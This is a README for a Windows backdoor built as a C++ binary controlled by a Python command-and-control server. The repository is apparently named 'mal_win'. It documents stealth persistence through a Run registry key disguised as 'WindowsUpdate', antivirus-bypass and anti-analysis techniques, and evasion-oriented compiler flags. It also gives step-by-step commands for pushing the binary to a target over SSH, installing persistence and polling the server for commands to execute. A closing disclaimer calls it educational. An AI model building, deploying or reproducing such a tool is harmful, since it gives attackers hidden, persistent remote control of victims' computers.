# Remote Command Executor

A cross-platform C++ remote command executor with Windows persistence, designed for remote system administration and command execution via HTTP.

## Features

- **Remote Command Execution**: Execute Windows commands from a remote Linux server
- **HTTP Communication**: JSON-based command retrieval via HTTP GET requests
- **Windows Persistence**: Auto-start on system boot using Windows Registry Run key
- **Stealth Operations**: Disguised as "WindowsUpdate" in registry
- **AV Bypass Techniques**: Multiple anti-analysis and evasion techniques
- **Command Output**: Captures and logs command execution results
- **Dynamic Configuration**: Server-side command configuration via JSON
- **Retry Logic**: Built-in retry mechanisms for DNS resolution and HTTP requests

## Architecture

### Components

1. **C++ Binary** (`remote_command_executor.cpp`)
   - Compiled for Windows x64
   - Size: ~276KB (statically linked)
   - No external dependencies

2. **C&C Server** (`server_new.py`)
   - Python-based HTTP server
   - Returns JSON responses with commands
   - Per-client command configuration

3. **Command Configuration** (`commands.json`)
   - JSON file for command management
   - Supports per-IP customization
   - Hot-reload on server restart

### Communication Flow

```
Windows Binary → HTTP GET → Linux Server
                ↓
            JSON Response
                ↓
        Execute Command
                ↓
        Log Output
```

## Installation

### Prerequisites

- **Build System**: MinGW-w64 cross-compiler
- **Target**: Windows 10/11 x64
- **Server**: Linux with Python 3.x

### Building

```bash
# Cross-compile from Linux/macOS
make -f Makefile.win.cpp

# Output: remote_command_executor_cpp_YYYYMMDD_HHMMSS.exe
```

### Deployment

1. **Transfer Binary to Windows**:
```bash
sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe
```

2. **Start C&C Server**:
```bash
cd server
python3 server_new.py
```

3. **Execute Binary on Windows**:
```bash
remote_cmd.exe <server_ip> <port> --debug
```

## Configuration

### Server Configuration (`commands.json`)

```json
{
  "default": {
    "command": "cmd /c whoami",
    "next": "YOUR_SERVER_IP",
    "sleep": 30
  },
  "192.168.1.100": {
    "command": "cmd /c systeminfo",
    "next": "YOUR_SERVER_IP",
    "sleep": 60
  }
}
```

**Fields**:
- `command`: Windows command to execute
- `next`: Next server IP/domain to connect to
- `sleep`: Seconds to wait before next request

### Persistence Configuration

The binary automatically configures Windows persistence:

- **Registry Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value Name**: `WindowsUpdate`
- **Value Data**: Full path to executable with arguments

## Usage

### Basic Execution

```bash
# Execute with server IP and port
remote_cmd.exe YOUR_SERVER_IP 8080

# Execute with debug logging
remote_cmd.exe YOUR_SERVER_IP 8080 --debug
```

### Server Management

```bash
# Start server
cd /root/asd
bash start_server.sh

# Update commands
vim commands.json
# Restart server to apply changes
bash start_server.sh

# Monitor server logs
tail -f /tmp/server_cnc.log
```

### Verification

```bash
# Check if binary is running on Windows
tasklist | findstr remote_cmd.exe

# Verify persistence registry entry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# Check server logs for requests
ssh root@server "tail -f /tmp/server_cnc.log | grep -A 15 'TARGET_IP'"
```

## Security Features

### Stealth Techniques

1. **Registry Disguise**: Uses "WindowsUpdate" name to blend in
2. **HKCU Persistence**: No admin privileges required
3. **No UAC Prompts**: Runs silently at user login
4. **Dynamic API Resolution**: Resolves Windows APIs at runtime
5. **Anti-Analysis**: Multiple AV bypass techniques implemented

### Evasion Techniques

- Obfuscated sleep patterns
- Dynamic DNS resolution with fallback
- Custom string operations to avoid detection
- No hardcoded strings in binary
- Stripped symbols and debugging information

## Testing

### End-to-End Test

```bash
# 1. Build binary
make -f Makefile.win.cpp

# 2. Transfer to Windows
sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe

# 3. Start server
ssh root@server "cd /root/asd && bash start_server.sh"

# 4. Execute binary
sshpass -p "password" ssh user@target "remote_cmd.exe SERVER_IP 8080 --debug"

# 5. Monitor server logs
ssh root@server "tail -f /tmp/server_cnc.log | grep TARGET_IP"
```

### Persistence Test

```bash
# 1. Execute binary (installs persistence)
remote_cmd.exe SERVER_IP 8080

# 2. Verify registry entry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# 3. Reboot system
shutdown /r /t 60

# 4. After reboot, verify binary auto-started
tasklist | findstr remote_cmd.exe
```

## Compilation Flags

```makefile
CC = x86_64-w64-mingw32-g++
CFLAGS = -std=c++11 -O3 -static-libgcc -static-libstdc++ -static \
         -s -Wl,--strip-all \
         -fno-stack-protector -fno-ident \
         -ffunction-sections -fdata-sections \
         -Wl,--gc-sections -Wl,--build-id=none \
         -fomit-frame-pointer -fno-unroll-loops
LIBS = -lws2_32 -ladvapi32 -lkernel32 -lntdll
```

## File Structure

```
.
├── remote_command_executor.cpp    # Main C++ source
├── Makefile.win.cpp               # Build configuration
├── server_new.py                  # C&C server
├── commands.json                  # Command configuration
├── start_server.sh                # Server startup script
└── README.md                      # This file
```

## Troubleshooting

### Binary Not Connecting

```bash
# Test network connectivity
curl http://SERVER_IP:8080/

# Check Windows firewall
netsh advfirewall show allprofiles

# Verify DNS resolution
nslookup SERVER_IP
```

### Persistence Not Working

```bash
# Verify registry entry exists
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# Check registry value points to correct path
# Should show full path to remote_cmd.exe with arguments

# Manually update if needed
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\path\to\remote_cmd.exe SERVER_IP PORT --debug" /f
```

### Server Not Responding

```bash
# Check if server is running
ps aux | grep server_new.py

# Verify port is listening
ss -tuln | grep 8080

# Check server logs
tail -f /tmp/server_cnc.log
```

## Development

### Building from Source

```bash
# Clone repository
git clone git@github.com:iklobato/mal_win.git
cd mal_win

# Build
make -f Makefile.win.cpp

# Clean build artifacts
make -f Makefile.win.cpp clean
```

### Testing Locally

```bash
# Start local server
python3 server_new.py

# Test with curl
curl http://localhost:8080/
# Expected: {"command": "...", "next": "...", "sleep": ...}
```

## License

This project is for educational and authorized testing purposes only. Unauthorized use is prohibited.

## Disclaimer

⚠️ **WARNING**: This tool is designed for legitimate system administration and authorized security testing only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse of this software.

## Credits

Developed for remote system administration and security research purposes.
